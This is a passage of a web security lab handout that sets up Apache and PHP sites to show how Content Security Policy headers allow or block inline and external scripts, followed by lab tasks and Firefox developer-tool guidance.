+<p>How websites tell browsers which code source is trustworthy is achieved
+using a security mechanism called Content Security Policy (CSP). This
+mechanism is specifically designed to defeat XSS and ClickJacking
+attacks. It has become a standard, which is supported by most browsers
+nowadays. CSP not only restricts JavaScript code, it also restricts
+other page contents, such as limiting where pictures, audio, and video
+can come from, as well as restricting whether a page can be put inside
+an iframe or not (used for defeating ClickJacking attacks). Here, we
+will only focus on how to use CSP to defeat XSS attacks.</p>
+<div class="section" id="experiment-website-setup">
+<h3>Experiment Website setup<a class="headerlink" href="#experiment-website-setup" title="Permalink to this headline">¶</a></h3>
+<p>To conduct experiments on CSP, we will set up several websites. Inside
+the <code class="docutils literal notranslate"><span class="pre">Labsetup/image_www</span></code> docker image folder, there is a file called
+<code class="docutils literal notranslate"><span class="pre">apache_csp.conf</span></code>. It defines five websites, which share the same
+folder, but they will use different files in this folder. The
+<code class="docutils literal notranslate"><span class="pre">example60</span></code> and <code class="docutils literal notranslate"><span class="pre">example70</span></code> sites are used for hosting JavaScript
+code. The <code class="docutils literal notranslate"><span class="pre">example32a</span></code>, <code class="docutils literal notranslate"><span class="pre">example32b</span></code>, and <code class="docutils literal notranslate"><span class="pre">example32c</span></code> are the
+three websites that have different CSP configurations. Details of the
+configuration will be explained later.</p>
+<p><strong>Changing the configuration file.</strong> In the experiment, you need to modify this Apache configuration file
+(<code class="docutils literal notranslate"><span class="pre">apache_csp.conf</span></code>). If you make a modification directly on the file
+inside the image folder, you need to rebuild the image and restart the
+container, so the change can take effect.</p>
+<p>You can also modify the file while the container is running. The
+downside of this option is that in order to keep the docker image small,
+we have only installed a very simple text editor called <code class="docutils literal notranslate"><span class="pre">nano</span></code> inside
+the container. It should be sufficient for simple editing. If you do not
+like it, you can always add an installation command to the
+<code class="docutils literal notranslate"><span class="pre">Dockerfile</span></code> to install your favorite command-line text editor. On the
+running container, you can find the configuration file
+<code class="docutils literal notranslate"><span class="pre">apache_csp.conf</span></code> inside the folder. After making changes, you need to
+restart the Apache server for the changes to take effect:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># service apache2 restart
+</pre></div>
+</div>
+<p><strong>DNS Setup.</strong> We will access the above websites from our VM. To access them through
+their respective URLs, we need to add the following entries to the
+<code class="docutils literal notranslate"><span class="pre">/etc/hosts</span></code> file (if you have not done so already at the beginning of
+the lab), so these hostnames are mapped to the IP address of the server
+container (<code class="docutils literal notranslate"><span class="pre">10.9.0.5</span></code>). You need to use the root privilege to change
+this file (using <code class="docutils literal notranslate"><span class="pre">sudo</span></code>).</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>10.9.0.5       www.example32a.com
+10.9.0.5       www.example32b.com
+10.9.0.5       www.example32c.com
+10.9.0.5       www.example60.com
+10.9.0.5       www.example70.com
+</pre></div>
+</div>
+</div>
+<div class="section" id="the-web-page-for-the-experiment">
+<h3>The web page for the experiment<a class="headerlink" href="#the-web-page-for-the-experiment" title="Permalink to this headline">¶</a></h3>
+<p>The <code class="docutils literal notranslate"><span class="pre">example32(a|b|c)</span></code> servers host the same web page <code class="docutils literal notranslate"><span class="pre">index.html</span></code>,
+which is used to demonstrate how the CSP policies work. In this page,
+there are six areas, <code class="docutils literal notranslate"><span class="pre">area1</span></code> to <code class="docutils literal notranslate"><span class="pre">area6</span></code>. Initially, each area
+displays <code class="docutils literal notranslate"><span class="pre">&quot;Failed&quot;</span></code>. The page also includes six pieces of JavaScript
+code, each trying to write <code class="docutils literal notranslate"><span class="pre">&quot;OK&quot;</span></code> to its corresponding area. If we can
+see <code class="docutils literal notranslate"><span class="pre">OK</span></code> in an area, that means, the JavaScript code corresponding to
+that area has been executed successfully; otherwise, we would see
+<code class="docutils literal notranslate"><span class="pre">Failed</span></code>. There is also a button on this page. If it is clicked, a
+message will pop up, if the underlying JavaScript code gets triggered.
+The following is the expirement web pages index.html:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;html&gt;
+&lt;h2 &gt;CSP Experiment&lt;/h2&gt;
+&lt;p&gt;1. Inline: Nonce (111-111-111): &lt;span id=&#39;area1&#39;&gt;Failed&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;2. Inline: Nonce (222-222-222): &lt;span id=&#39;area2&#39;&gt;Failed&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;3. Inline: No Nonce: &lt;span id=&#39;area3&#39;&gt;Failed&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;4. From self: &lt;span id=&#39;area4&#39;&gt;Failed&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;5. From www.example60.com: &lt;span id=&#39;area5&#39;&gt;Failed&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;6. From www.example70.com: &lt;span id=&#39;area6&#39;&gt;Failed&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;7. From button click:
+      &lt;button onclick=&quot;alert(&#39;JS Code executed!&#39;)&quot;&gt;Click me&lt;/button&gt;&lt;/p&gt;
+
+&lt;script type=&quot;text/javascript&quot; nonce=&quot;111-111-111&quot;&gt;
+document.getElementById(&#39;area1&#39;).innerHTML = &quot;OK&quot;;
+&lt;/script&gt;
+
+&lt;script type=&quot;text/javascript&quot; nonce=&quot;222-222-222&quot;&gt;
+document.getElementById(&#39;area2&#39;).innerHTML = &quot;OK&quot;;
+&lt;/script&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+document.getElementById(&#39;area3&#39;).innerHTML = &quot;OK&quot;;
+&lt;/script&gt;
+
+&lt;script src=&quot;script_area4.js&quot;&gt; &lt;/script&gt;
+&lt;script src=&quot;http://www.example60.com/script_area5.js&quot;&gt; &lt;/script&gt;
+&lt;script src=&quot;http://www.example70.com/script_area6.js&quot;&gt; &lt;/script&gt;
+&lt;/html&gt;
+</pre></div>
+</div>
+</div>
+<div class="section" id="setting-csp-policies">
+<h3>Setting CSP Policies<a class="headerlink" href="#setting-csp-policies" title="Permalink to this headline">¶</a></h3>
+<p>CSP is set by the web server as an HTTP header. There are two typical
+ways to set the header, by the web server (such as Apache) or by the web
+application. In this experiment, we will conduct experiments using both
+approaches.</p>
+<p><strong>CSP configuration by Apache.</strong> Apache can set HTTP headers for all the responses, so we can use Apache
+to set CSP policies. In our configuration, we set up three websites, but
+only the second one sets CSP policies (the lines marked by ■). With this
+setup, when we visit <code class="docutils literal notranslate"><span class="pre">example32b</span></code>, Apache will add the specified CSP
+header to all the response from this site.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span># Purpose: Do not set CSP policies
+&lt;VirtualHost *:80&gt;
+    DocumentRoot /var/www/csp
+    ServerName www.example32a.com
+    DirectoryIndex index.html
+&lt;/VirtualHost&gt;
+
+# Purpose: Setting CSP policies in Apache configuration
+&lt;VirtualHost *:80&gt;
+    DocumentRoot /var/www/csp
+    ServerName www.example32b.com
+    DirectoryIndex index.html
+    Header set Content-Security-Policy &quot; \          ■
+             default-src &#39;self&#39;; \                  ■
+             script-src &#39;self&#39; *.example70.com \    ■
+           &quot;
+&lt;/VirtualHost&gt;
+
+# Purpose: Setting CSP policies in web applications
+&lt;VirtualHost *:80&gt;                                  ●
+    DocumentRoot /var/www/csp
+    ServerName www.example32c.com
+    DirectoryIndex phpindex.php
+&lt;/VirtualHost&gt;
+</pre></div>
+</div>
+<p><strong>CSP configuration by web applications.</strong> For the third <code class="docutils literal notranslate"><span class="pre">VirtualHost</span></code> entry in our configuration file (marked by ●
+), we did not set up any CSP policy. However, instead of accessing
+<code class="docutils literal notranslate"><span class="pre">index.html</span></code>, the entry point of this site is <code class="docutils literal notranslate"><span class="pre">phpindex.php</span></code>, which
+is a PHP program. This program, listed below, adds a CSP header to the
+response generated from the program.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>&lt;?php
+  $cspheader = &quot;Content-Security-Policy:&quot;.
+               &quot;default-src &#39;self&#39;;&quot;.
+               &quot;script-src &#39;self&#39; &#39;nonce-111-111-111&#39; *.example70.com&quot;.
+               &quot;&quot;;
+  header($cspheader);
+?&gt;
+
+&lt;?php include &#39;index.html&#39;;?&gt;
+</pre></div>
+</div>
+</div>
+<div class="section" id="lab-tasks-2">
+<h3>Lab tasks 2<a class="headerlink" href="#lab-tasks-2" title="Permalink to this headline">¶</a></h3>
+<p>After starting the containers and making changes to the <code class="docutils literal notranslate"><span class="pre">/etc/hosts</span></code>,
+please visit the following URLs from your VM.</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>http://www.example32a.com
+http://www.example32b.com
+http://www.example32c.com
+</pre></div>
+</div>
+<ol class="arabic simple">
+<li><p>Describe and explain your observations when you visit these websites.</p></li>
+<li><p>Click the button in the web pages from all the three websites,
+describe and explain your observations.</p></li>
+<li><p>Change the server configuration on <code class="docutils literal notranslate"><span class="pre">example32b</span></code> (modify the Apache
+configuration), so Areas 5 and 6 display OK. Please include your
+modified configuration in the lab report.</p></li>
+<li><p>Change the server configuration on <code class="docutils literal notranslate"><span class="pre">example32c</span></code> (modify the PHP
+code), so Areas 1, 2, 4, 5, and 6 all display <code class="docutils literal notranslate"><span class="pre">OK</span></code>. Please include
+your modified configuration in the lab report.</p></li>
+<li><p>Please explain why CSP can help prevent Cross-Site Scripting attacks.</p></li>
+</ol>
+</div>
+</div>
+<div class="section" id="guidelines">
+<h2>Guidelines<a class="headerlink" href="#guidelines" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="using-the-http-header-live-add-on-to-inspect-http-headers">
+<h3>Using the “HTTP Header Live” add-on to Inspect HTTP Headers<a class="headerlink" href="#using-the-http-header-live-add-on-to-inspect-http-headers" title="Permalink to this headline">¶</a></h3>
+<p>The version of Firefox (version 60) in our Ubuntu 16.04 VM does not support the LiveHTTPHeader
+add-on, which was used in our Ubuntu 12.04 VM. A new add-on called “HTTP Header Live” is used
+in its place. The instruction on how to enable and use this add-on tool is depicted in Figure 1. Just click the
+icon marked by ➀; a sidebar will show up on the left. Make sure that HTTP Header Live is selected
+at position ➁. Then click any link inside a web page, all the triggered HTTP requests will be captured and
+displayed inside the sidebar area marked by ➂. If you click on any HTTP request, a pop-up window will
+show up to display the selected HTTP request. Unfortunately, there is a bug in this add-on tool (it is still
+under development); nothing will show up inside the pop-up window unless you change its size (It seems
+that re-drawing is not automatically triggered when the window pops up, but changing its size will trigger
+the re-drawing).</p>
+<div class="align-center figure" id="id1">
+<img alt="../../_images/xss_img1.png" src="../../_images/xss_img1.png" />
+<p class="caption"><span class="caption-text">Figure 1: Enable the HTTP Header Live Add-on</span><a class="headerlink" href="#id1" title="Permalink to this image">¶</a></p>
+</div>
+<p>5.2 Using the Web Developer Tool to Inspect HTTP Headers
+There is another tool provided by Firefox that can be quite useful in inspecting HTTP headers. The tool is
+the Web Developer Network Tool. In this section, we cover some of the important features of the tool. The
+Web Developer Network Tool can be enabled via the following navigation:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Click Firefox’s top right menu --&gt; Web Developer --&gt; Network
+   or
+Click the &quot;Tools&quot; menu --&gt; Web Developer --&gt; Network
+</pre></div>
+</div>
+<p>We use the user login page in Elgg as an example. Figure 2 shows the Network Tool showing the HTTP
+POST request that was used for login.</p>
+<div class="align-center figure" id="id2">
+<img alt="../../_images/xss_img2.png" src="../../_images/xss_img2.png" />
+<p class="caption"><span class="caption-text">Figure 2: HTTP Request in Web Developer Network Tool</span><a class="headerlink" href="#id2" title="Permalink to this image">¶</a></p>
+</div>
+<p>To further see the details of the request, we can click on a particular HTTP request and the tool will
+show the information in two panes (see Figure 3).
+The details of the selected request will be visible in the right pane. Figure 4(a) shows the details of the
+login request in the <code class="docutils literal notranslate"><span class="pre">Headers</span></code> tab (details include URL, request method, and cookie). One can observe
+both request and response headers in the right pane. To check the parameters involved in an HTTP request,
+we can use the <code class="docutils literal notranslate"><span class="pre">Params</span></code> tab. Figure 4(b) shows the parameter sent in the login request to Elgg, including
+<code class="docutils literal notranslate"><span class="pre">username</span></code> and <code class="docutils literal notranslate"><span class="pre">password</span></code>. The tool can be used to inspect HTTP GET requests in a similar manner to
+HTTP POST requests.</p>
+<p><strong>Font Size</strong>. The default font size of Web Developer Tools window is quite small. It can be increased by
+focusing click anywhere in the Network Tool window, and then using Ctrl and + button</p>
+<div class="align-center figure" id="id3">
+<img alt="../../_images/xss_img3.png" src="../../_images/xss_img3.png" />
+<p class="caption"><span class="caption-text">Figure 3: HTTP Request and Request Details in Two Panes</span><a class="headerlink" href="#id3" title="Permalink to this image">¶</a></p>
+</div>
+<div class="align-center figure" id="id4">
+<img alt="../../_images/xss_img4.png" src="../../_images/xss_img4.png" />
+<p class="caption"><span class="caption-text">Figure 4: HTTP Headers and Parameters</span><a class="headerlink" href="#id4" title="Permalink to this image">¶</a></p>
+</div>
+</div>
+<div class="section" id="javascript-debugging">
+<h3>JavaScript Debugging<a class="headerlink" href="#javascript-debugging" title="Permalink to this headline">¶</a></h3>
+<p>We may also need to debug our JavaScript code. Firefox’s Developer Tool can also help debug JavaScript
+code. It can point us to the precise places where errors occur. The following instruction shows how to enable
+this debugging tool:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Click the &quot;Tools&quot; menu --&gt; Web Developer --&gt; Web Console
+or use the Shift+Ctrl+K shortcut.
+</pre></div>
+</div>
+<p>Once we are in the web console, click the JS tab. Click the downward pointing arrowhead beside JS
+and ensure there is a check mark beside Error. If you are also interested in Warning messages, click
+Warning. See Figure 5.
+If there are any errors in the code, a message will display in the console. The line that caused the error
+appears on the right side of the error message in the console. Click on the line number and you will be taken
+to the exact place that has the error. See Figure 6.</p>
+<div class="align-center figure" id="id5">
+<img alt="../../_images/xss_img5.png" src="../../_images/xss_img5.png" />
+<p class="caption"><span class="caption-text">Figure 5: Debugging JavaScript Code (1)</span><a class="headerlink" href="#id5" title="Permalink to this image">¶</a></p>
+</div>
+<div class="align-center figure" id="id6">
+<img alt="../../_images/xss_img6.png" src="../../_images/xss_img6.png" />
+<p class="caption"><span class="caption-text">Figure 6: Debugging JavaScript Code (2)</span><a class="headerlink" href="#id6" title="Permalink to this image">¶</a></p>
+</div>
+</div>
+</div>
+<div class="section" id="submission">
+<h2>Submission<a class="headerlink" href="#submission" title="Permalink to this headline">¶</a></h2>
+<p>You need to submit a detailed lab report, with screenshots, to describe what you have done and what you
+have observed. You also need to provide explanation to the observations that are interesting or surprising.
+Please also list the important code snippets followed by explanation. Simply attaching code without any
+explanation will not receive credits.</p>
+</div>
+</div>
+
+
+           </div>
+           
+          </div>
+          <footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+        <a href="Web_CSRF_Elgg.html" class="btn btn-neutral float-right" title="Cross-Site Request Forgery (CSRF) Attack Lab" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="web_index.html" class="btn btn-neutral float-left" title="Web Security Labs" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &#169; Copyright 2021, NEXUS Lab.
+
+    </p>
+  </div>
+    
+    
+    
+    Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    
+    provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script>
+
+  
+  
+    
+   
+
+</body>
+</html>
